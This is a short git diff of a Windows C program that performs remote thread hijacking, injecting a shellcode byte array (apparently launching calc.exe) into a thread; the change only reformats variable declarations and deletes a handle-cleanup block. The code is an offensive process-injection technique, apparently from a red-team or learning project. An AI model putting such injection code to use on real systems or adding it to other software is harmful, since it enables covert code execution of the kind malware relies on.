@@ -35,10 +35,10 @@ int main()
 0x63,0x2e,0x65,0x78,0x65,0x00
 	};
 
-	HANDLE hThread = NULL;
-	DWORD dwProcessId = NULL;
-	SIZE_T shellsize = sizeof(Shellcode);
-	PVOID pAddress = NULL;
+	HANDLE	hThread		= NULL;
+	DWORD	dwProcessId = 0;
+	SIZE_T	shellsize	= sizeof(Shellcode);
+	PVOID	pAddress	= NULL;
 
 	INFO("Performing Injection...");
 	if (!InjectThread(&hThread, Shellcode, shellsize, &pAddress))
@@ -60,15 +60,6 @@ int main()
 	}
 
 	OKAY("Successfully completed Remote Thread Hijacking!");
-
-	CHAR("Cleanup!");
-	getchar();
-
-	if (hThread)
-	{
-		INFO("[0x%p] Closing hThread...", hThread);
-		CloseHandle(hThread);
-	}
 
 	CHAR("Quit...");
 	getchar();
